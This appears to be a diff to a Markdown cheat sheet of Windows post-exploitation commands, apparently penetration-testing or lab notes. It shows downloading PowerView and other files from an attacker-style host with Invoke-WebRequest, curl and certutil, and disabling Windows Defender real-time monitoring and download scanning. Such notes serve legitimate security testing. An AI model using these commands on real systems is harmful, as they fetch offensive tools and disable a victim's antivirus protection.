@@ -10,6 +10,10 @@ whoami /priv
 Download Files
 ```Powershell
 Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1
+
+curl -o example.txt http://example.com/file.txt
+
+certutil.exe -urlcache -split -f http://<ip>/file file_save
 ```
 
 Get Processes
@@ -21,12 +25,15 @@ Get-Process -Name "notepad"
 
 Disable AV
 ```powershell
-# Disable real-time protection 
+# Disable Windows Defender real time monitoring
 Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable Windows Defender scanning for all files downloaded
+Set-MpPreference -DisableIOAVProtection $true
 ```
 
 List Network Connections
-```Powershell
+```powershell
 netstat -aon
 ```
 
